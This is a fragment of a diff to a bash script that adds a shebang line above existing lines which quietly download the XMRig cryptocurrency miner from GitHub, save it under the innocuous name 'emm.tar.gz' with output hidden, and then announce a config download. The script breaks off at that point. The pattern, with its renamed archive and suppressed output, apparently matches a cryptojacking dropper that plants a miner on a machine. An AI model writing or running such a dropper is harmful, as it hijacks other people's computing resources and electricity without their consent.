@@ -1,3 +1,4 @@
+#!/bin/bash
 echo Downloading_Prog
 wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz -O emm.tar.gz >> /dev/null
 echo Downloading_config
